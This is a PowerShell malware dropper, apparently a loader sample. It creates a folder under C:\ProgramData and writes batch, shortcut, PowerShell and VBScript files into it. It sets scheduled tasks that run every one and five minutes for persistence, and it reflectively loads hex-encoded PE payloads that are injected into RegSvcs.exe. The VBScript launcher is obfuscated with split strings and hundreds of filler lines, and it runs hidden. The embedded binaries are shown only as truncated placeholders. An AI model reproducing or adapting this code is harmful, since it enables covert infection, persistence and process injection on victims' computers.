$L1 = "C:\ProgramData\Expend"
New-Item $L1 -ItemType Directory -Force
start-sleep 2
$Content = @'
PowerShell -NoProfile -ExecutionPolicy Bypass -Command C:\ProgramData\Expend\Expend.PS1
'@
[IO.File]::WriteAllText("C:\ProgramData\Expend\Expend.bat", $Content)
$Content = @'
PowerShell -NoProfile -ExecutionPolicy Bypass -Command C:\ProgramData\Expend\xx.PS1
'@
[IO.File]::WriteAllText("C:\ProgramData\Expend\xx.bat", $Content)
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut("C:\ProgramData\Expend\box.lnk")
 $Shortcut.TargetPath = "C:\ProgramData\Expend\Expend.bat"
$Shortcut.Arguments = ""
$Shortcut.WindowStyle = 7
$Shortcut.Save()
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut("C:\ProgramData\Expend\xx.lnk")
 $Shortcut.TargetPath = "C:\ProgramData\Expend\xx.bat"
$Shortcut.Arguments = ""
$Shortcut.WindowStyle = 7
$Shortcut.Save()
$Content = @'
function go {
param($Fuck)$Fuck = $Fuck -split '(..)' | ? { $_ }
ForEach ($chrome in $Fuck){[Convert]::ToInt32($chrome,16)}}
[byte[]] $bytes2  = go('4D5A9000030000000...000000000000000') # NOTE: The actual 124928-character Base64 string omitted for readability.
[byte[]] $bytes  = go('4D5A9000030000000...0000000000'); # NOTE: The actual 110592-character Base64 string omitted for readability.
Try{$x = [Reflection.Assembly]}catch{}
Try{$load = 'Load'}catch{}
Try{$Expend = 'NewPE.PE'}catch{}
Try{$h = $x::$load($bytes).GetType($Expend)}catch{}
Try{$k = 'Execute'}catch{}
Try{$o = $h.GetMethod($k)}catch{}
Try{$Z = 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe'}catch{}
Try{$C = [OBJECT[]]}catch{}
Try{$hh = $null,{$C}}catch{}
Try{$o.Invoke($hh, ($Z,$bytes2))}catch{}
schtasks /delete /tn det /f
'@
[IO.File]::WriteAllText("C:\ProgramData\Expend\Expend.PS1", $Content)
$Content = @'
try 
{
$EASTNOD = <#Code 3losh#> New-ScheduledTaskAction <#Code 3losh#> -Execute <#Code 3losh#> 'C:\ProgramData\Expend\Expend.vbs'
$trigger =  New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
Register-ScheduledTask  -Action  $EASTNOD  -Trigger  $trigger  -TaskName "Expend"
$EASTNOD = <#Code 3losh#> New-ScheduledTaskAction <#Code 3losh#> -Execute <#Code 3losh#> 'C:\ProgramData\Expend\Expend.vbs'
$trigger =  New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask  -Action  $EASTNOD  -Trigger  $trigger  -TaskName "det"
} catch { }
'@
[IO.File]::WriteAllText("C:\ProgramData\Expend\xx.ps1", $Content)
$Content = @'
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
GJCF = ("t.S")
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
ANMC = ("p"+GJCF+"h")
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
PCLC = ("ri"+ANMC+"el")
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
UGOS = ("Sc")
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
Set OBJ1 = CreateObject("W"+UGOS+PCLC+"l")
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
NewPath = Replace("C:\ProgramData\Expend\box.lnk","@","")
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
on error resume next
OBJ1.Run NewPath,ChrW("4"+"8")
'@
[IO.File]::WriteAllText("C:\ProgramData\Expend\Expend.vbs", $Content)
start-sleep 7
$H1 = "C:\ProgramData\Expend\xx.lnk"
$FT2D = $H1
start $FT2D
